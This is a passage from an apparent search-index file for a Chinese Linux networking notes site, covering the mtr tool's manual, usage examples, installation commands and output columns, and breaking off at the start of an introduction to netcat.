\u603b\u7684\u6765\u8bf4\uff0cmtr\u63d0\u4f9b\u4e86\u4e00\u79cd\u5b9e\u65f6\u3001\u52a8\u6001\u7684\u65b9\u5f0f\u6765\u67e5\u770b\u6570\u636e\u5305\u4ece\u6e90\u8ba1\u7b97\u673a\u5230\u76ee\u6807\u4e3b\u673a\u7684\u8def\u5f84\u4ee5\u53ca\u6bcf\u4e2a\u8dc3\u70b9\u7684\u6027\u80fd\u7edf\u8ba1\u3002\u9ad8\u7684\u4e22\u5305\u7387\u6216\u5f88\u957f\u7684\u5f80\u8fd4\u65f6\u95f4\u53ef\u80fd\u8868\u793a\u7f51\u7edc\u4e2d\u5b58\u5728\u95ee\u9898\u3002 WinMTR \u7684\u5404\u5217\u6570\u636e\u7684\u542b\u4e49\u5982\u4e0b\uff1a Hostname : \u8fd9\u4e00\u5217\u663e\u793a\u4e86\u7ecf\u8fc7\u7684\u8def\u7531\u8282\u70b9\u7684\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u3002 Nr : \u8868\u793a\u8df3\u6570\uff0c\u4ece 1 \u5f00\u59cb\u7f16\u53f7\uff0c\u4ee3\u8868\u8def\u5f84\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u6216\u4ea4\u6362\u673a\u7684\u4f4d\u7f6e\u3002 Loss% : \u663e\u793a\u4ece\u6d4b\u8bd5\u4e3b\u673a\u53d1\u9001\u5230\u8be5\u8282\u70b9\u7684\u6570\u636e\u5305\u4e2d\u6709\u591a\u5c11\u767e\u5206\u6bd4\u672a\u6536\u5230\u54cd\u5e94\u3002\u4f8b\u5982\uff0c 100 \u8868\u793a\u6240\u6709\u6570\u636e\u5305\u90fd\u4e22\u5931\u4e86\u3002 Sent : \u663e\u793a\u53d1\u9001\u5230\u8be5\u8282\u70b9\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Recv : \u663e\u793a\u4ece\u8be5\u8282\u70b9\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Best : \u6700\u4f73\u54cd\u5e94\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u5230\u8be5\u8282\u70b9\u7684\u6700\u77ed\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u901a\u5e38\u662f\u6beb\u79d2\u3002 Avg : \u5e73\u5747\u54cd\u5e94\u65f6\u95f4\uff0c\u5373\u5230\u8be5\u8282\u70b9\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4\u3002 Worst : \u6700\u5dee\u54cd\u5e94\u65f6\u95f4\uff0c\u5373\u5230\u8be5\u8282\u70b9\u7684\u6700\u957f\u5f80\u8fd4\u65f6\u95f4\u3002 Last : \u6700\u540e\u4e00\u6b21\u6d4b\u91cf\u5230\u8be5\u8282\u70b9\u7684\u5f80\u8fd4\u65f6\u95f4\u3002 \u8fd9\u4e9b\u8282\u70b9\u914d\u7f6e\u4e86\u4e0d\u54cd\u5e94 ICMP \u6216\u8005 TCP ping \u8bf7\u6c42\uff0c\u4e22\u5305\u7387\u53ef\u80fd\u4e3a 100%\u3002","title":"mtr\u6d4b\u8bd5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/#mtr","text":"","title":"mtr\u5de5\u5177"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/#man","text":"\u540d\u79f0 mtr \uff08My Traceroute\uff09\u662f\u4e00\u4e2a\u7f51\u7edc\u8bca\u65ad\u5de5\u5177\uff0c\u7ed3\u5408\u4e86 traceroute \u548c ping \u547d\u4ee4\u7684\u529f\u80fd\u3002\u5b83\u7528\u4e8e\u663e\u793a\u5230\u76ee\u6807\u670d\u52a1\u5668\u7684\u8def\u7531\u8def\u5f84\uff0c\u5e76\u8fde\u7eed\u6d4b\u8bd5\u548c\u62a5\u544a\u6bcf\u4e2a\u8def\u7531\u8df3\u70b9\uff08hop\uff09\u7684\u7f51\u7edc\u8d28\u91cf\u3002 mtr \u63d0\u4f9b\u4e86\u5173\u4e8e\u7f51\u7edc\u8fde\u63a5\u7684\u5b9e\u65f6\u6570\u636e\uff0c\u5305\u62ec\u8def\u7531\u8def\u5f84\u3001\u4f20\u8f93\u5ef6\u8fdf\u548c\u4e22\u5305\u7b49\u4fe1\u606f\u3002 \u6982\u8ff0 mtr [-BfhvrctglxspQemniuTP46] [--help] [--version] [--report] [--report-wide] [--report-cycles COUNT] [--curses] [--split] [--raw] [--xml] [--mpls] [--no-dns] [--show-ips] [--gtk] [--address IP.ADD.RE.SS] [--interval SECONDS] [--max-ttl NUM] [--first-ttl NUM] [--bitpattern NUM] [--tos NUM] [--psize BYTES | -s BYTES] [--tcp] [--udp] [--port PORT] [--timeout SECONDS] HOSTNAME [PACKETSIZE] \u63cf\u8ff0 mtr \u7ed3\u5408\u4e86 traceroute \u548c ping \u7a0b\u5e8f\u7684\u529f\u80fd\uff0c\u6210\u4e3a\u4e00\u4e2a\u5355\u4e00\u7684\u7f51\u7edc\u8bca\u65ad\u5de5\u5177\u3002\u5f53 mtr \u542f\u52a8\u65f6\uff0c\u5b83\u4f1a\u68c0\u67e5\u8fd0\u884c mtr \u7684\u4e3b\u673a\u4e0e HOSTNAME \u4e4b\u95f4\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u901a\u8fc7\u53d1\u9001\u5177\u6709\u7279\u610f\u8bbe\u5b9a\u7684\u4f4e TTL \u7684\u6570\u636e\u5305\u3002\u5b83\u7ee7\u7eed\u53d1\u9001\u4f4e TTL \u7684\u6570\u636e\u5305\uff0c\u6ce8\u610f\u4e2d\u95f4\u8def\u7531\u5668\u7684\u54cd\u5e94\u65f6\u95f4\u3002\u8fd9\u4f7f mtr \u80fd\u591f\u6253\u5370\u5230 HOSTNAME \u7684\u7f51\u7edc\u8def\u5f84\u7684\u54cd\u5e94\u767e\u5206\u6bd4\u548c\u54cd\u5e94\u65f6\u95f4\u3002\u7a81\u7136\u7684\u6570\u636e\u5305\u4e22\u5931\u6216\u54cd\u5e94\u65f6\u95f4\u7684\u589e\u52a0\u901a\u5e38\u8868\u793a\u4e00\u4e2a\u4e0d\u597d\u7684\uff08\u6216\u7b80\u5355\u7684\u8d85\u8f7d\u7684\uff09\u94fe\u63a5\u3002\u7ed3\u679c\u901a\u5e38\u4ee5\u6beb\u79d2\u7684\u5f80\u8fd4\u54cd\u5e94\u65f6\u95f4\u548c\u4e22\u5305\u767e\u5206\u6bd4\u62a5\u544a\u3002 \u9009\u9879 -h --help \u8f93\u51fa\u547d\u4ee4\u884c\u53c2\u6570\u9009\u9879\u7684\u6458\u8981\u3002 -v --version \u6253\u5370 mtr \u7684\u5df2\u5b89\u88c5\u7248\u672c\u3002 -r --report \u6b64\u9009\u9879\u4f7f mtr \u8fdb\u5165\u62a5\u544a\u6a21\u5f0f\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0cmtr \u5c06\u8fd0\u884c\u7531 -c \u9009\u9879\u6307\u5b9a\u7684\u5faa\u73af\u6b21\u6570\uff0c\u7136\u540e\u6253\u5370\u7edf\u8ba1\u4fe1\u606f\u5e76\u9000\u51fa\u3002\u8fd9\u79cd\u6a21\u5f0f\u5bf9\u4e8e\u751f\u6210\u5173\u4e8e\u7f51\u7edc\u8d28\u91cf\u7684\u7edf\u8ba1\u6570\u636e\u975e\u5e38\u6709\u7528\u3002\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u8fd0\u884c\u7684 mtr \u5b9e\u4f8b\u90fd\u4f1a\u751f\u6210\u5927\u91cf\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u4f7f\u7528 mtr \u6765\u6d4b\u91cf\u7f51\u7edc\u7684\u8d28\u91cf\u53ef\u80fd\u5bfc\u81f4\u7f51\u7edc\u6027\u80fd\u4e0b\u964d\u3002 -w --report-wide \u6b64\u9009\u9879\u4f7f mtr \u8fdb\u5165\u5bbd\u62a5\u544a\u6a21\u5f0f\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0cmtr \u5728\u62a5\u544a\u4e2d\u4e0d\u4f1a\u622a\u65ad\u4e3b\u673a\u540d\u3002 -c COUNT --report-cycles COUNT \u4f7f\u7528\u6b64\u9009\u9879\u8bbe\u7f6e\u53d1\u9001\u7684 ping \u6570\u91cf\uff0c\u4ee5\u786e\u5b9a\u7f51\u7edc\u4e0a\u7684\u673a\u5668\u53ca\u5176\u53ef\u9760\u6027\u3002\u6bcf\u4e2a\u5faa\u73af\u6301\u7eed\u4e00\u79d2\u3002 -s BYTES --psize BYTES PACKETSIZE \u8fd9\u4e9b\u9009\u9879\u6216\u547d\u4ee4\u884c\u672b\u5c3e\u7684 PACKETSIZE \u7528\u4e8e\u8bbe\u7f6e\u7528\u4e8e\u63a2\u6d4b\u7684\u6570\u636e\u5305\u5927\u5c0f\u3002\u5b83\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff0c\u5305\u62ec IP \u548c ICMP \u5934\u90e8\u3002\u5982\u679c\u8bbe\u7f6e\u4e3a\u8d1f\u6570\uff0c\u6bcf\u6b21\u8fed\u4ee3\u90fd\u4f1a\u4f7f\u7528\u4e0d\u540c\u7684\u968f\u673a\u6570\u636e\u5305\u5927\u5c0f\uff0c\u6700\u5927\u4e0d\u8d85\u8fc7\u8be5\u6570\u5b57\u3002 -t --curses \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u4f7f\u7528\u57fa\u4e8e curses \u7684\u7ec8\u7aef\u754c\u9762\uff08\u5982\u679c\u53ef\u7528\uff09\u3002 -e --mpls \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u663e\u793a\u6765\u81ea ICMP \u6269\u5c55\u7684 MPLS (RFC 4950) \u4fe1\u606f\uff0c\u8be5\u4fe1\u606f\u88ab\u7f16\u7801\u5728\u54cd\u5e94\u6570\u636e\u5305\u4e2d\u3002 -n --no-dns \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u663e\u793a\u6570\u5b57 IP \u5730\u5740\uff0c\u4e0d\u5c1d\u8bd5\u89e3\u6790\u4e3b\u673a\u540d\u3002 -b --show-ips \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u540c\u65f6\u663e\u793a\u4e3b\u673a\u540d\u548c\u6570\u5b57 IP \u5730\u5740\u3002\u5728\u5206\u88c2\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u4f1a\u5728\u8f93\u51fa\u4e2d\u589e\u52a0\u4e00\u4e2a\u989d\u5916\u7684\u5b57\u6bb5\u3002\u5728\u62a5\u544a\u6a21\u5f0f\u4e2d\uff0c\u901a\u5e38\u6ca1\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u6dfb\u52a0 IP\uff0c\u5b83\u4eec\u5c06\u88ab\u622a\u65ad\u3002\u4f7f\u7528\u5bbd\u62a5\u544a (-w) \u6a21\u5f0f\u5728\u62a5\u544a\u6a21\u5f0f\u4e2d\u67e5\u770b IP\u3002 -o fields order --order fields order \u4f7f\u7528\u6b64\u9009\u9879\u5728\u52a0\u8f7d mtr \u65f6\u6307\u5b9a\u5b57\u6bb5\u53ca\u5176\u987a\u5e8f\u3002 \u53ef\u7528\u5b57\u6bb5\uff1a \u6807\u8bc6 \u63cf\u8ff0 L \u4e22\u5305\u6bd4\u4f8b D \u4e22\u5931\u7684\u6570\u636e\u5305 R \u63a5\u6536\u7684\u6570\u636e\u5305 S \u5df2\u53d1\u9001\u7684\u6570\u636e\u5305 N \u6700\u65b0\u7684 RTT(\u6beb\u79d2) B \u6700\u5c0f/\u6700\u597d\u7684 RTT(\u6beb\u79d2) A \u5e73\u5747 RTT(\u6beb\u79d2) W \u6700\u5927/\u6700\u5dee\u7684 RTT(\u6beb\u79d2) V \u6807\u51c6\u504f\u5dee G \u51e0\u4f55\u5747\u503c J \u5f53\u524d\u6296\u52a8 M \u6296\u52a8\u5747\u503c X \u6700\u5dee\u6296\u52a8 I \u5230\u8fbe\u95f4\u9694\u6296\u52a8 \u793a\u4f8b\uff1a-o \"LSD NBAW\" -g --gtk \u4f7f\u7528\u6b64\u9009\u9879\u5f3a\u5236 mtr \u4f7f\u7528\u57fa\u4e8e GTK+ \u7684 X11 \u7a97\u53e3\u754c\u9762\uff08\u5982\u679c\u53ef\u7528\uff09\u3002\u5f53 mtr \u6784\u5efa\u65f6\u7cfb\u7edf\u4e0a\u5fc5\u987b\u6709 GTK+ \u624d\u80fd\u4f7f\u5176\u5de5\u4f5c\u3002\u66f4\u591a\u5173\u4e8e GTK+ \u7684\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee http://www.gtk.org/ \u3002 -p --split \u4f7f\u7528\u6b64\u9009\u9879\u8bbe\u7f6e mtr \u4ee5\u8f93\u51fa\u9002\u5408\u4e8e\u5206\u88c2\u7528\u6237\u754c\u9762\u7684\u683c\u5f0f\u3002 -l --raw \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u4f7f\u7528\u539f\u59cb\u8f93\u51fa\u683c\u5f0f\u3002\u6b64\u683c\u5f0f\u66f4\u9002\u5408\u6d4b\u91cf\u7ed3\u679c\u7684\u5b58\u6863\u3002\u5b83\u53ef\u4ee5\u88ab\u89e3\u6790\u4ee5\u5448\u73b0\u5230\u4efb\u4f55\u5176\u4ed6\u663e\u793a\u65b9\u6cd5\u3002 -x --xml \u4f7f\u7528\u6b64\u9009\u9879\u544a\u8bc9 mtr \u4f7f\u7528 xml \u8f93\u51fa\u683c\u5f0f\u3002\u6b64\u683c\u5f0f\u66f4\u9002\u5408\u4e8e\u6d4b\u91cf\u7ed3\u679c\u7684\u81ea\u52a8\u5904\u7406\u3002 -a IP.ADD.RE.SS --address IP.ADD.RE.SS \u4f7f\u7528\u6b64\u9009\u9879\u5c06\u53d1\u51fa\u7684\u6570\u636e\u5305\u7684\u5957\u63a5\u5b57\u7ed1\u5b9a\u5230\u7279\u5b9a\u63a5\u53e3\uff0c\u8fd9\u6837\u4efb\u4f55\u6570\u636e\u5305\u90fd\u4f1a\u901a\u8fc7\u6b64\u63a5\u53e3\u53d1\u9001\u3002\u8bf7\u6ce8\u610f\uff0c\u6b64\u9009\u9879\u4e0d\u9002\u7528\u4e8e DNS \u8bf7\u6c42\u3002 -i SECONDS --interval SECONDS \u4f7f\u7528\u6b64\u9009\u9879\u6307\u5b9a ICMP ECHO \u8bf7\u6c42\u4e4b\u95f4\u7684\u6b63\u6570\u79d2\u6570\u3002\u6b64\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u79d2\u3002 -m NUM --max-ttl NUM \u6307\u5b9a traceroute \u5c06\u63a2\u6d4b\u7684\u6700\u5927\u8df3\u6570\uff08\u6700\u5927\u751f\u5b58\u65f6\u95f4\u503c\uff09\u3002\u9ed8\u8ba4\u662f30\u3002 -f NUM --first-ttl NUM \u6307\u5b9a\u4ece\u54ea\u4e2a TTL \u5f00\u59cb\u3002\u9ed8\u8ba4\u503c\u4e3a1\u3002 -B NUM --bitpattern NUM \u6307\u5b9a\u5728\u8d1f\u8f7d\u4e2d\u4f7f\u7528\u7684\u4f4d\u6a21\u5f0f\u3002\u5e94\u57280 - 255\u8303\u56f4\u5185\u3002 -Q NUM --tos NUM \u6307\u5b9a IP \u6807\u5934\u4e2d\u670d\u52a1\u7c7b\u578b\u5b57\u6bb5\u7684\u503c\u3002\u5e94\u57280 - 255\u8303\u56f4\u5185\u3002 -u --udp \u4f7f\u7528 UDP \u6570\u636e\u62a5\u800c\u4e0d\u662f ICMP ECHO\u3002 -T --tcp \u4f7f\u7528 TCP SYN \u6570\u636e\u5305\u800c\u4e0d\u662f ICMP ECHO\u3002PACKETSIZE \u88ab\u5ffd\u7565\uff0c\u56e0\u4e3a SYN \u6570\u636e\u5305\u4e0d\u80fd\u5305\u542b\u6570\u636e\u3002 -P PORT --port PORT TCP \u8ddf\u8e2a\u7684\u76ee\u6807\u7aef\u53e3\u53f7\u3002 --timeout SECONDS \u5728\u653e\u5f03\u8fde\u63a5\u4e4b\u524d\u4fdd\u6301 TCP \u5957\u63a5\u5b57\u6253\u5f00\u7684\u79d2\u6570\u3002\u8fd9\u53ea\u4f1a\u5f71\u54cd\u6700\u540e\u4e00\u8df3\u3002\u5bf9\u6b64\u4f7f\u7528\u5927\u7684\u503c\uff0c\u7279\u522b\u662f\u4e0e\u77ed\u95f4\u9694\u7ed3\u5408\u4f7f\u7528\uff0c\u5c06\u4f7f\u7528\u5927\u91cf\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002 -4 \u4ec5\u4f7f\u7528 IPv4\u3002 -6 \u4ec5\u4f7f\u7528 IPv6\u3002 \u95ee\u9898 \u4e00\u4e9b\u73b0\u4ee3\u8def\u7531\u5668\u6bd4\u5176\u4ed6\u7f51\u7edc\u6d41\u91cf\u5bf9 ICMP ECHO \u6570\u636e\u5305\u7684\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002\u56e0\u6b64\uff0cmtr \u62a5\u544a\u7684\u8fd9\u4e9b\u8def\u7531\u5668\u7684\u53ef\u9760\u6027\u5c06\u6bd4\u8fd9\u4e9b\u8def\u7531\u5668\u7684\u5b9e\u9645\u53ef\u9760\u6027\u663e\u8457\u964d\u4f4e\u3002 \u8054\u7cfb\u4fe1\u606f \u8981\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff0c\u8bf7\u8bbf\u95ee mtr \u7f51\u9875\uff1ahttp://www.bitwizard.nl/mtr/\u3002","title":"MAN\u624b\u518c"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/#mtr_1","text":"\u57fa\u672c\u4f7f\u7528 : mtr example.com \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u542f\u52a8\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 mtr \u4f1a\u8bdd\uff0c\u6301\u7eed\u5730\u76d1\u63a7\u4ece\u5f53\u524d\u7cfb\u7edf\u5230 example.com \u7684\u8def\u5f84\u3002 \u4ec5\u4f7f\u7528IPv4 : mtr -4 example.com \u8fd9\u5c06\u4ec5\u4f7f\u7528IPv4\u8fdb\u884c\u8ffd\u8e2a\u3002 \u4ec5\u4f7f\u7528IPv6 : mtr -6 example.com \u8fd9\u5c06\u4ec5\u4f7f\u7528IPv6\u8fdb\u884c\u8ffd\u8e2a\u3002 \u663e\u793a\u62a5\u544a : mtr -r -c 10 example.com \u8fd9\u5c06\u53d1\u900110\u4e2a\u6570\u636e\u5305\u5230 example.com \uff0c\u7136\u540e\u663e\u793a\u7edf\u8ba1\u62a5\u544a\u5e76\u9000\u51fa\u3002 \u663e\u793a\u5bbd\u62a5\u544a : mtr -rw example.com \u4e0e\u4e0a\u9762\u7684\u62a5\u544a\u6a21\u5f0f\u76f8\u4f3c\uff0c\u4f46\u4f1a\u4f7f\u7528\u5bbd\u683c\u5f0f\u4ee5\u907f\u514d\u4e3b\u673a\u540d\u88ab\u622a\u65ad\u3002 \u4e0d\u89e3\u6790DNS : mtr -n example.com \u8fd9\u5c06\u663e\u793a\u6570\u5b57IP\u5730\u5740\uff0c\u800c\u4e0d\u662f\u5c1d\u8bd5\u89e3\u6790\u4e3b\u673a\u540d\u3002 \u4f7f\u7528UDP\u6570\u636e\u62a5 : mtr -u example.com \u4f7f\u7528TCP SYN\u6570\u636e\u5305 : mtr -T example.com \u6307\u5b9a\u6570\u636e\u5305\u5927\u5c0f : mtr -s 100 example.com \u8fd9\u5c06\u4f7f\u7528100\u5b57\u8282\u7684\u6570\u636e\u5305\u8fdb\u884c\u8ffd\u8e2a\u3002 \u6307\u5b9a\u65f6\u95f4\u95f4\u9694 : mtr -i 2 example.com \u8fd9\u5c06\u6bcf2\u79d2\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\u3002 \u8fd9\u53ea\u662f mtr \u7684\u4e00\u4e9b\u57fa\u672c\u4f7f\u7528\u5b9e\u4f8b\u3002\u7531\u4e8e mtr \u662f\u4e00\u4e2a\u529f\u80fd\u4e30\u5bcc\u7684\u5de5\u5177\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u9009\u9879\u548c\u914d\u7f6e\u53ef\u7528\u3002\u4e3a\u4e86\u66f4\u5168\u9762\u5730\u4e86\u89e3\u8fd9\u4e9b\u529f\u80fd\uff0c\u5efa\u8bae\u67e5\u770b\u5176\u5b98\u65b9\u6587\u6863\u6216\u4f7f\u7528 man mtr \u547d\u4ee4\u3002","title":"\u4ee5\u4e0b\u662f\u4e00\u4e9bmtr\u7684\u5e38\u7528\u5b9e\u4f8b"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/#_1","text":"Debian/Ubuntu : \u4f7f\u7528apt\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo apt update sudo apt install mtr Fedora : \u4f7f\u7528dnf\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo dnf install mtr CentOS/RHEL : \u9996\u5148\uff0c\u786e\u4fdd\u542f\u7528\u4e86EPEL\u4ed3\u5e93\uff0c\u7136\u540e\u4f7f\u7528yum\u8fdb\u884c\u5b89\u88c5\uff1a sudo yum install epel-release sudo yum install mtr openSUSE : \u4f7f\u7528zypper\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo zypper install mtr Arch Linux/Manjaro : \u4f7f\u7528pacman\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\uff1a sudo pacman -S mtr FreeBSD : \u4f7f\u7528pkg\u5305\u7ba1\u7406\u5668\u6216ports\u96c6\u5408\u8fdb\u884c\u5b89\u88c5\uff1a sudo pkg install mtr \u6216 cd /usr/ports/net/mtr/ && make install clean macOS : \u5982\u679c\u5df2\u7ecf\u5b89\u88c5\u4e86Homebrew\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5\uff1a brew install mtr Windows : Windows\u4e0a\u6ca1\u6709\u539f\u751f\u7684 mtr \u5de5\u5177\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u5982 WinMTR \uff0c\u8fd9\u662f\u4e00\u4e2a mtr \u7684Windows\u56fe\u5f62\u7248\u672c\u3002\u53ef\u4ee5\u4ece\u5176\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5b89\u88c5\u5305\u5e76\u8fdb\u884c\u5b89\u88c5\u3002 \u5bf9\u4e8e\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u6216\u53d1\u884c\u7248\uff0c\u5efa\u8bae\u67e5\u770b\u5176\u5b98\u65b9\u6587\u6863\u6216\u8f6f\u4ef6\u4ed3\u5e93\u4ee5\u83b7\u53d6\u6709\u5173\u5982\u4f55\u5b89\u88c5 mtr \u7684\u6307\u5357\u3002 \u662f mtr \u8f93\u51fa\u7ed3\u679c\u7684\u89e3\u91ca\uff1a","title":"\u5404\u4e2a\u7cfb\u7edf\u5b89\u88c5\u65b9\u5f0f"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/mtr%E5%B7%A5%E5%85%B7/#mtr_2","text":"mtr\u7ed3\u5408\u4e86traceroute\u548cping\u7684\u529f\u80fd\uff0c\u5b83\u663e\u793a\u4e86\u4ece\u6e90\u8ba1\u7b97\u673a\u5230\u76ee\u6807\u4e3b\u673a\u7684\u8def\u5f84\uff0c\u5e76\u63d0\u4f9b\u4e86\u6bcf\u4e2a\u8dc3\u70b9\u7684\u7edf\u8ba1\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u8f93\u51fa\u5217\u7684\u542b\u4e49\uff1a HOP \uff1a - \u8868\u793a\u6570\u636e\u5305\u9700\u8981\u7ecf\u8fc7\u7684\u8dc3\u70b9\u6216\u8def\u7531\u5668\u6570\u91cf\uff0c\u4ece\u6e90\u8ba1\u7b97\u673a\u5f00\u59cb\u3002 Host \uff1a - \u8fd9\u4e00\u5217\u663e\u793a\u4e86\u6bcf\u4e2a\u8dc3\u70b9\u7684\u57df\u540d\u6216IP\u5730\u5740\u3002 Loss% \uff1a - \u663e\u793a\u4e86\u4e22\u5931\u7684\u6570\u636e\u5305\u767e\u5206\u6bd4\u3002 Snt \uff1a - \u53d1\u9001\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Last \uff1a - \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5305\u7684\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Avg \uff1a - \u6240\u6709\u6570\u636e\u5305\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Best \uff1a - \u6240\u6709\u6570\u636e\u5305\u4e2d\u7684\u6700\u77ed\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 Wrst \uff1a - \u6240\u6709\u6570\u636e\u5305\u4e2d\u7684\u6700\u957f\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002 StDev \uff1a \u5f80\u8fd4\u65f6\u95f4\u7684\u6807\u51c6\u504f\u5dee\uff0c\u8868\u793a\u5f80\u8fd4\u65f6\u95f4\u7684\u53d8\u5316\u7a0b\u5ea6\u3002 \u603b\u7684\u6765\u8bf4\uff0cmtr\u63d0\u4f9b\u4e86\u4e00\u79cd\u5b9e\u65f6\u3001\u52a8\u6001\u7684\u65b9\u5f0f\u6765\u67e5\u770b\u6570\u636e\u5305\u4ece\u6e90\u8ba1\u7b97\u673a\u5230\u76ee\u6807\u4e3b\u673a\u7684\u8def\u5f84\u4ee5\u53ca\u6bcf\u4e2a\u8dc3\u70b9\u7684\u6027\u80fd\u7edf\u8ba1\u3002\u9ad8\u7684\u4e22\u5305\u7387\u6216\u5f88\u957f\u7684\u5f80\u8fd4\u65f6\u95f4\u53ef\u80fd\u8868\u793a\u7f51\u7edc\u4e2d\u5b58\u5728\u95ee\u9898\u3002 WinMTR \u7684\u5404\u5217\u6570\u636e\u7684\u542b\u4e49\u5982\u4e0b\uff1a Hostname : \u8fd9\u4e00\u5217\u663e\u793a\u4e86\u7ecf\u8fc7\u7684\u8def\u7531\u8282\u70b9\u7684\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\u3002 Nr : \u8868\u793a\u8df3\u6570\uff0c\u4ece 1 \u5f00\u59cb\u7f16\u53f7\uff0c\u4ee3\u8868\u8def\u5f84\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u6216\u4ea4\u6362\u673a\u7684\u4f4d\u7f6e\u3002 Loss% : \u663e\u793a\u4ece\u6d4b\u8bd5\u4e3b\u673a\u53d1\u9001\u5230\u8be5\u8282\u70b9\u7684\u6570\u636e\u5305\u4e2d\u6709\u591a\u5c11\u767e\u5206\u6bd4\u672a\u6536\u5230\u54cd\u5e94\u3002\u4f8b\u5982\uff0c 100 \u8868\u793a\u6240\u6709\u6570\u636e\u5305\u90fd\u4e22\u5931\u4e86\u3002 Sent : \u663e\u793a\u53d1\u9001\u5230\u8be5\u8282\u70b9\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Recv : \u663e\u793a\u4ece\u8be5\u8282\u70b9\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\u603b\u6570\u3002 Best : \u6700\u4f73\u54cd\u5e94\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u5230\u8be5\u8282\u70b9\u7684\u6700\u77ed\u5f80\u8fd4\u65f6\u95f4\uff0c\u5355\u4f4d\u901a\u5e38\u662f\u6beb\u79d2\u3002 Avg : \u5e73\u5747\u54cd\u5e94\u65f6\u95f4\uff0c\u5373\u5230\u8be5\u8282\u70b9\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4\u3002 Worst : \u6700\u5dee\u54cd\u5e94\u65f6\u95f4\uff0c\u5373\u5230\u8be5\u8282\u70b9\u7684\u6700\u957f\u5f80\u8fd4\u65f6\u95f4\u3002 Last : \u6700\u540e\u4e00\u6b21\u6d4b\u91cf\u5230\u8be5\u8282\u70b9\u7684\u5f80\u8fd4\u65f6\u95f4\u3002 \u8fd9\u4e9b\u8282\u70b9\u914d\u7f6e\u4e86\u4e0d\u54cd\u5e94 ICMP \u6216\u8005 TCP ping \u8bf7\u6c42\uff0c\u4e22\u5305\u7387\u53ef\u80fd\u4e3a 100%\u3002","title":"mtr \u8f93\u51fa\u7ed3\u679c\u89e3\u91ca"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/nc%E5%91%BD%E4%BB%A4/","text":"nc\u547d\u4ee4\uff0c\u5168\u79f0netcat\uff0c\u662f\u4e00\u79cd\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u5de5\u5177\uff0c\u88ab\u5e7f\u6cdb\u7528\u4e8e\u7f51\u7edc\u8c03\u8bd5\u548c\u63a2\u6d4b\u3002\u5b83\u901a\u5e38\u88ab\u79f0\u4e3a\u201c\u7f51\u7edc\u754c\u7684\u745e\u58eb\u519b\u5200\u201d\uff0c\u56e0\u4e3a\u5b83\u80fd\u591f\u6267\u884c\u591a\u79cd\u7f51\u7edc\u76f8\u5173\u7684\u4efb\u52a1\u3002\u8fd9\u4e9b\u4efb\u52a1\u5305\u62ec\uff1a 1.\u573a\u666f\uff1aIT\u652f\u6301\u56e2\u961f\u6d4b\u8bd5\u516c\u53f8\u7f51\u7ad9\u7684\u7aef\u53e3\u8fde\u901a\u6027 